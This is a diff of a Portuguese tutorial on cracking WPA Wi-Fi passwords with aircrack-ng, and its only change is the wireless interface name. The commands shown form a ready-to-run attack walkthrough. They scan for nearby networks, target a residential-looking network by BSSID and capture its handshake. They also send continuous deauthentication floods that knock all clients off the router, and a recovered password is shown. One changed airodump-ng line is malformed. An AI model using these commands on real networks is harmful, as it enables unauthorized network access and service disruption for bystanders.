@@ -41,7 +41,7 @@ sudo airmon-ng check kill
 ## Coloca a placa de rede wi-fi em modo monitoramento:
 
 ```bash
-sudo airmon-ng start wlan0
+sudo airmon-ng start wlp0s20f3
 ```
 
 ## Valida o novo nome da sua placa de captura de redes wi-fi:
@@ -57,7 +57,7 @@ sudo airmon-ng
 ## Inicia o scan de todas as redes próximas (aparecerão diversas redes):
 
 ```bash
-sudo airodump-ng wlan0mon
+sudo airodump-ng start wlp0s20f3mon
 ```
 
 ## Encerra o scan das redes após escolher o alvo:
@@ -83,7 +83,7 @@ Condominio_Flores_II
 ## Podemos validar apenas a rede alvo, se preferir:
 
 ```bash
-sudo airodump-ng wlan0mon -d 64:D1:54:09:EE:3E
+sudo airodump-ng wlp0s20f3mon -d 64:D1:54:09:EE:3E
 ```
 
 ## Posso me conectar á rede wi-fi alvo, se for um laboratório, usando um celular.
@@ -95,11 +95,11 @@ sudo airodump-ng wlan0mon -d 64:D1:54:09:EE:3E
 ## Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:
 
 ```bash
-sudo airodump-ng -w capturados -c 2 --bssid 64:D1:54:09:EE:3E wlan0mon
+sudo airodump-ng -w capturados -c 2 --bssid 64:D1:54:09:EE:3E wlp0s20f3mon
 ```
 OU
 ```bash
-sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlan0mon
+sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlp0s20f3mon
 ```
 
 Á partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU
@@ -109,13 +109,13 @@ sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlan0mon
 ## Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):
 
 ```bash
-sudo aireplay-ng --deauth 0 -a 64:D1:54:09:EE:3E wlan0mon
+sudo aireplay-ng --deauth 0 -a 64:D1:54:09:EE:3E wlp0s20f3mon
 ```
 
 Posso tbém, desautenticar apenas um dispositivo específico
 
 ```bash
-sudo aireplay-ng --deauth 5 -a 64:D1:54:09:EE:3E -c 28:6C:07:6F:F9:53 wlan0mon
+sudo aireplay-ng --deauth 5 -a 64:D1:54:09:EE:3E -c 28:6C:07:6F:F9:53 wlp0s20f3mon
 ```
 
 ## Ao tentar re-conexão, os clientes entregam o handshake de 4 vias no TERMINAL 01:
@@ -183,7 +183,7 @@ KEY FOUNF [ P@ssword123 ]
 ## Retira a placa de rede wi-fi do modo monitoramento:
 
 ```bash
-airmon-ng stop wlan0mon
+airmon-ng stop wlp0s20f3mon
 ```
 
 ## Restaura sua placa de rede para navegação:
